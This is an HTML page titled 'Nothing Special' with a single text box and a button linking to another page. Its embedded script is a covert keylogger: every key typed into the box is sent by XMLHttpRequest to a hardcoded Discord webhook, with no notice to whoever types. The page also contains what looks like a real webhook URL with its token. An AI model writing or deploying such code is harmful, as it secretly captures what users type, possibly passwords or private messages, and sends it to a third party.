<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nothing Special</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div>
        <input type="text" id="textInput" placeholder="Type something...">
    </div>
    <br>
    <button onclick="location.href='hhh.html';">Alert Message Test</button>
    
    <script>
        // Your Discord webhook URL
        var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1218575470186991708/9dMvk0-5RBBPvUrsm7kv7oIS183aXZpxcg6LGMazPz5Cj8jsRhGQ2_pNCRmuaumuDpNj";

        // Get the input field
        var inputField = document.getElementById('textInput');

        // Add event listener for keydown event on input field
        inputField.addEventListener("keydown", function(event) {
            var key_pressed = event.key;
            var message = "Key pressed while typing: " + key_pressed;
            sendToDiscord(message);
        });

        // Function to send message to Discord webhook
        function sendToDiscord(message) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", DISCORD_WEBHOOK_URL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ content: message }));
        }
    </script>
</body>
</html>
